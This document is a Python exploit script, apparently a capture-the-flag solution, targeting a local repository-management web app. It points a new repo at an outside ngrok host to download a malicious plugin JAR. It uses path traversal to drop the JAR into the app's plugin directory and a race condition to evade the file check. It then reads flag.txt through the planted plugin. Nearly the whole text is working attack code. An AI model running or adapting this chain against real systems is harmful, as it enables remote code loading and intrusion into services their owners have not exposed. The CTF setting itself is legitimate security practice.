import requests
import time
import random
import string
import threading

BASE_URL = "http://127.0.0.1:1337"
EVIL_URL = "https://b703-24-176-103-131.ngrok-free.app"

def async_post(url, json_data):
    try:
        with requests.post(url,json=json_data) as response:
            data = response.json()
            return data
    except Exception as e:
        print(f"Error fetching data from {url}: {e}")

def rand_repo():
    return "".join([random.choice(string.ascii_lowercase) for x in range(5)])

repo_name = rand_repo()

# Create a new evil HTTP repo to pull malicious jar file
print("[+] Creating evil HTTP repo: %s" % repo_name)
R = requests.post(BASE_URL+"/api/repos/add",json={"name":repo_name,"type":"HTTPStorage","config":{"url":EVIL_URL}})

# Get the current time
T = int(time.time())

# App doesn't check if a plugin exists when creating the repo so we can pre-set a repo
repo_name_2 = rand_repo()

print("[+] Pre-adding malicious repo")
R = requests.post(BASE_URL+"/api/repos/add",json={"name":repo_name_2,"type":"EvilStorage","config":{}})

# Create race condition by pulling malicious jar pugin and then delaying the second file for a few seconds so the first doesn't get checked
print("[+] Requesting file copy")
thread = threading.Thread(
    target=async_post,
    args=(BASE_URL+"/api/repos/copy",{"source":repo_name,"target":"default","files":["../../../app/plugins/storage/EvilStorage.jar","delayme"]})
)
thread.start()

# Wait for the first jar to be downloaded
while True:
    R = requests.get(BASE_URL+"/api/repos/view/%s" % repo_name_2)
    # This repo exists and we can grab the flag
    if "Plugin JAR not found" not in R.text:
        print("[+] Repo exists! Requesting flag")
        R = requests.get(BASE_URL+"/api/repos/file/%s/flag.txt" % repo_name_2)
        J = R.json()
        print("Response: %s" % J["data"]["content"])
        exit()
    time.sleep(0.5)